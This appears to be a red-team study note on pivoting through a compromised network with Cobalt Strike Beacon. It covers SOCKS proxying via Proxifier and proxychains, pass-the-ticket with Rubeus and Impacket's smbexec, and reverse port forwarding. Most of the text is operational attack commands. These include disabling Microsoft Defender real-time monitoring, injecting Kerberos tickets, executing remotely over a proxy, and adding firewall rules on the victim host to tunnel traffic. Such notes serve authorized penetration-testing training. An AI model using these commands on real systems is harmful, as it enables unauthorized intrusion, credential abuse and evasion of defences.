_Pivoting_ is a tactic used by adversaries to proxy traffic in or out of a network, when it would normally be disallowed, using Beacon as the pivot point.

Modifying /etc/hosts in Windows
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '<IP> <hostname>'
```
## SOCKS
Cobalt Strike and Beacon can act as a SOCKS proxy to exchange traffic between an external adversary, and machines internal to the target network.
![[Pasted image 20251228141722.png]]

Workflow
```powershell
1. ## Add static DNS entries
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '<IP> <hostname>'

2. ## Set up Beacon as tunnel
beacon> socks [port (1080)] [version (socks5)] # default port 1080, socks5 is good version

3. ## Setup of proxifier (Windows) OR proxychains (Linux)
# Proxifier Setup
Run Proxifier.exe
Profile > Proxy Servers > Add
	Address : [Team Server], Port : [port], Protocol : [version]
	Use this proxy by default? -> No
	Edit Proxification Rules now? -> Yes.
Add a new proxification rule
	Name: Beacon
	Applications : Any, Target Hosts : [internal ip range / subnet]
	Target Ports: Any
	Action: select proxy server

# Proxychains Setup 
sudo vim /etc/proxychains.conf        # or nano
	Comment out "proxy_dns" (line 38)   
	socks5 [Team Server IP] [Port used]  
# WSL inherits static host entries from Windows, so you don't need to add them to /etc/hosts if you've already added them in Windows.

4. ## Setup your environment
Set-MpPreference -DisableRealtimeMonitoring $true
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1

5. ## Run commands
# For linux, preface commands like 'proxychains <cmd>'
```
#### Authentication
Windows
	We can authenticate with plaintext creds or Kerberos tickets. NTLM is also possible but bad OPSEC.
	Kerberos requires hostnames so we need to add statis host entries. See step 2 in Workflow above.

Leveraging Kerberos tickets
```powershell
## ALL LOCAL, NOT ON BEACON
# Start new process locally with kerberos ticket
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:[DOMAIN] /username:[user] /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /show

# Verify ticket has been injected
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

# Request service tickets prior to doing anything. To query AD, we need LDAP
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/[DC hostname] /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /dc:[DC hostname] /ptt

# Verify
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

# Querying DC
ipmo ActiveDirectory
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server [DC Hostname] | select DistinguishedName
```

Linux
	Impacket (and other Linux tools) can also use Kerberos tickets, but they need to be in [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) format.   `ticketConverter.py` can convert from kirbi to ccache and vice versa.

Leveraging Kerberos tickets
```bash
# Convert .kirbi to .ccache
ticketConverter.py rsteel.kirbi rsteel.ccache

# Set up environment to use ticket
export KRB5CCNAME=/path/to/rsteel.ccache

# Use any command to auth WITH proxychains
proxychains smbexec.py -no-pass -k -dc-ip [DC Hostname] [DOMAIN]/[user]@[hostname]
```

## Reverse Port Forwards
Reverse of SOCKS. Reverse port forward allows tunneling traffic out from the inside.

Why?
	Might have remote execution on a computer somewhere, but no ability to upload a payload.

We also need to add firewall rules on Beacon computer to explicitly allow traffic. 
	Requires local admin.
	Computer will block all inbound traffic by default.

Creating a Reverse Port Forward
```powershell
# Syntax
beacon> rportfwd [bind port] [forward host] [forward port]
	# bind : Beacon listens on this
	# forward : Beacon forwards traffic to this host on specified port

# Add firwwall rule to allow inbound traffic
beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190       # port number is arbitrary...

# Start reverse port forward
beacon> rportfwd 28190 localhost 80  # inbound traffic -> internal web server

# Test
beacon> remote-exec winrm [hostname of computer] iwr http://[hostname w/ beacon]:28190/test

# Cleanup
beacon> rportfwd stop 28190
beacon> run netsh advfirewall firewall delete rule name="Debug"
```
